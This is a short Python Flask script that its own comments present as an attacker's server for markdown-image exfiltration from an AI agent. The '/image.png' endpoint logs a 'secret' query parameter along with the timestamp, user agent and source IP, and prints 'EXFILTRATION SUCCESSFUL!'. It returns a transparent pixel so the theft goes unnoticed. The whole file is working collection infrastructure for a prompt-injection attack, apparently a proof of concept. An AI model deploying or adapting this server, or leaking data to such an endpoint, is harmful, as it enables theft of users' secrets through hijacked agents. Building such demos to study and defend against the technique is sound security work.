from flask import Flask, request, Response
from datetime import datetime
import logging

# Reduce Flask's default logging noise so you only see your exfiltration logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

@app.route('/image.png', methods=['GET'])
def receive_exfiltration():
    """Endpoint that captures exfiltrated secrets via markdown image rendering"""
    # 1. Capture the data sent by the Agent
    secret = request.args.get('secret', 'NO_SECRET')
    
    # 2. Capture Metadata
    timestamp = datetime.now().isoformat()
    user_agent = request.headers.get('User-Agent')
    source_ip = request.remote_addr
    
    # 3. Log the successful attack to the terminal
    print(f"\n{'='*60}")
    print(f"EXFILTRATION SUCCESSFUL! (Data Received at Server)")
    print(f"{'='*60}")
    print(f"Timestamp:  {timestamp}")
    print(f"Secret Key: {secret}")
    print(f"User-Agent: {user_agent}")
    print(f"Source IP:  {source_ip}")
    print(f"{'='*60}\n")
    
    # 4. Return a 1x1 transparent PNG to avoid a "broken image" icon in the browser
    # This keeps the attack stealthy
    pixel = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
    
    return Response(pixel, mimetype='image/png')

if __name__ == '__main__':
    print("😈 Attacker server listening on http://0.0.0.0:5000...")
    app.run(host='0.0.0.0', port=5000, debug=False)